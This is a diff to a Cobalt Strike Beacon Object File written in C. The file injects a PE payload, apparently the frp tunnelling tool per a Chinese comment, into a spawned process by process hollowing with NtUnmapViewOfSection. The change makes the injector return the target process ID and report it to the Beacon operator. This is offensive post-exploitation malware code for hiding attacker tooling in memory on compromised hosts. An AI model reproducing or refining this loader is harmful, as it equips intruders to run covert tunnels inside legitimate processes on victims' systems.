@@ -3,7 +3,7 @@
 #include "bofdefs.h"
 
 typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
-void inject(char* peName, char* shellcode, SIZE_T shellcode_len) {
+int inject(char* peName, char* shellcode, SIZE_T shellcode_len) {
     IN PIMAGE_DOS_HEADER pDosHeaders;
     IN PIMAGE_NT_HEADERS pNtHeaders;
     IN PIMAGE_SECTION_HEADER pSectionHeaders;
@@ -89,7 +89,9 @@ void inject(char* peName, char* shellcode, SIZE_T shellcode_len) {
 
     fnCloseHandle(pi.hThread);
     fnCloseHandle(pi.hProcess);
+    return pi.dwProcessId;
 }
+
 
 
 /*
@@ -108,6 +110,7 @@ void go(char* args, int length) {
     SIZE_T    index;
     SIZE_T    state = 0;
     HANDLE    hMapFile;
+    int       target_pid = 0;
     char      mapName[] = "d2295641ee77cf0d"; 
     void* mapAddr;
     WINBOOL   isUploadFinish = 0;
@@ -190,10 +193,11 @@ void go(char* args, int length) {
             /* 创建指示内存中已经存在frp 的 mapview */
             //if (!createStateMutex()) BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create state mutex");
             //spawn(peName, mapAddr, total_size);
-            inject(peName, mapAddr, total_size);
+            target_pid = inject(peName, mapAddr, total_size);
 
             KERNEL32$CloseHandle(mapAddr);
             KERNEL32$CloseHandle(hMapFile);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Run Successfully, target pid is %d", target_pid);
         }
     }
 }
